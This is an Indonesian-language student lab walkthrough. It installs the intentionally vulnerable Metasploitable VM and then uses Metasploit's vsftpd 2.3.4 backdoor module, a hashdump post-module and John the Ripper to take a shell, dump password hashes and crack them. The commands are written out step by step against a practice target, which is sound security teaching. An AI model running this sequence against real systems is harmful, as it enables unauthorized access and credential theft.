# Tugas 4

## Pendahuluan

&nbsp;&nbsp;&nbsp; Komputer sebagai perangkat yang sering digunakan untuk memudahkan pekerjaan manusia di berbagai bidang membuat perangkat ini dimiliki oleh setiap orang. Sistem operasi yang mengendalikan dan mengkoordinasikan semua perangkat keras yang bekerja di komputer menjadikan munculnya berbagai tipe sistem operasi yang berkembang di pasaran, dimulai dari sistem operasi yang berbayar seperti Windows hingga yang gratis atau open sourceseperti Linux.

&nbsp;&nbsp;&nbsp; Sistem operasi yang berkembang saat ini selalu mengalami pembaharuan untuk meningkatkan kinerja serta kualitas yang dimilikinya. Perkembangan sistem operasi yang berbasis graphic user interface seperti Windows lebih banyak digunakan dibandingkan dengan sistem operasi yang harus mengandalkan command seperti Linux. Versi Windows yang banyak mengalami penyempurnaan akan tetapi masih terdapat celah keamanan yang dapat dieksploitasi dengan berbagai cara yang mengakibatkan komputer dapat dieksploitasi dan dimanfaatkan oleh orang yang tidak memiliki hak akses ke dalam sebuah sistem.

&nbsp;&nbsp;&nbsp; Untuk mengetahui celah keamanan tersebut perlu adanya pengujian atau penetrasi untuk menguji dan mencari celah keamanan apa saja yang dapat dieksploitasi di sistem operasi Windows yang baru diinstal yang dapat digunakan untuk masuk ke dalam sebuah sistem tanpa memiliki hak akses.

&nbsp; Pengujian ini menggunakan softwareMetasploit Framework yang berfungsi untuk melakukan penetrasi ke sistem operasi Windows untuk mencari kelemahan dan celah keamanan yang dapat dieksploitasi serta mencari solusi untuk mengatasi kekurangan tersebut.

## Instalasi

### -Instalasi Metasploitable pada Virtual Box



1. Download dan install Virtual Box pada komputer anda.
1. Setelah instalasi selesai, buka Virtual Box dan klik "New".

![alt text](https://scontent-sit4-1.xx.fbcdn.net/v/t34.0-12/15356755_1380978318593630_3194431754367144286_n.jpg?oh=f087713c84352ad23b6478a8493fe365&oe=5849DC89 "")

3. Anda bisa memberikan nama, tujuannya kita memberi nama pada Metasploitable hanya untuk memastikan nama itu dimengerti dan mudah untuk dikenali.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;![alt text](https://scontent-sit4-1.xx.fbcdn.net/v/t34.0-12/15380732_1380971348594327_7514329790307194132_n.jpg?oh=0246f9be1fd2c43b4417052ac6bc505e&oe=5848BEE2 "")

4. Untuk memori, anda setidaknya mengalokasikan memori minimal 256MB. Namun jika anda mempunyai RAM yang cukup besar, anda bisa meninambahkan alokasi memorinya. 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;![alt text](https://scontent-sit4-1.xx.fbcdn.net/v/t34.0-12/15319080_1380971545260974_1520687697596227853_n.jpg?oh=d64003d28cba89fdba1374e5ff8c275a&oe=5848FFEB "")

5. Di dalam jendela "Create Virtual Machine", anda dapat memilih lokasi gambar yang telah anda download sebelumnya (setelah mengekstrak file ZIP nya). Klik logo folder di sebelah kanan bawah dan cari lokasi gambar Metasploitable.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;![alt text](https://scontent-sit4-1.xx.fbcdn.net/v/t34.0-12/15327502_1380972465260882_5014155796298159778_n.jpg?oh=0402f6e77f2519d2f1f2d58683729e8f&oe=5848C3B3 "")

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ketika selesai, klik "Create"

6. Langkah selanjutnya adalah kita harus menjalankan machine yang baru saja kita install. Pilih Metasploitable OS dan klik "Start".
7. Machine metasploitable akan booting dan seperti ini tampilan window nya.

![alt text](https://scontent-sit4-1.xx.fbcdn.net/v/t34.0-12/15284855_1380970998594362_1369452897915757503_n.jpg?oh=3f4082ecf41161618c6ca0aa1782a7c3&oe=5848F2DA "")

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Secara default usernamenya: msfadmin dan passwordnya: msfadmin. Anda bisa merubah &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;username dan password setelah log in dan menjadikan root.  

## Uji Penetrasi Metasploit

### Exploit vsftpd_234_backdoor

1. Masuk ke metasploit console dengan cara mengetikkan perintah: `msfconsole`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/vsftpd_1.PNG "")

2. Setelah masuk ke metasploit console, kita akan mencari exploitnya dengan mengetikkan perintah: `search vsftpd`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/vsftpd_2.PNG "")

3. Setelah mendapatkan yang kita cari, kemudian kita masuk kedalamnya dengan mengetikkan perintah: `use exploit/unix/ftpvsftpd_234_backdoor` dan jangan lupa untuk setting ip target yang akan di exploit dengan mengetikkan perintah: `set RHOST [IP_Target]`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/vsftpd_3.PNG "")

4. Kita akan melakukan exploit. Ketikkan perintah: `exploit`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/vsftpd_4.PNG "")

5. Lihat session yang sedang berjalan dengan perintah: `sessions -l`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/vsftpd_5.PNG "")

6. Kemudian kita akan melihat post apa saja yang tersedia dengan mengetikkan perintah: `show post`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/vsftpd_6.PNG "")

7. Misalnya disini saya akan melakukan exploit terhadap hashdump. Kita ketikkan perintah: `use post/linux/gather/hashdump`. Kemudian set session yang sedang berjalan dengan perintah: `set session 1`. Untuk eksekusi ketikkan perintah: `run`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/vsftpd_7.PNG "")

8. Saat kita mengecek file dump tersebut, isi filenya masih terenkiprsi. Oleh karena itu kita akan mendecrypt dengan bantuan tool lain, yaitu John de Ripper. Untuk menjalankan tool tersebut kita akan masuk ke direktori `/usr/sbin`, kemudian jalankan John de Ripper dengan mengetikkan perintah: `./john [Lokasi_File_Hashdump]`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/vsftpd_8.PNG "")

9. Dari gambar di atas, setelah file dump berhasil di decrypt kita dapat melihat username dan password target kita.
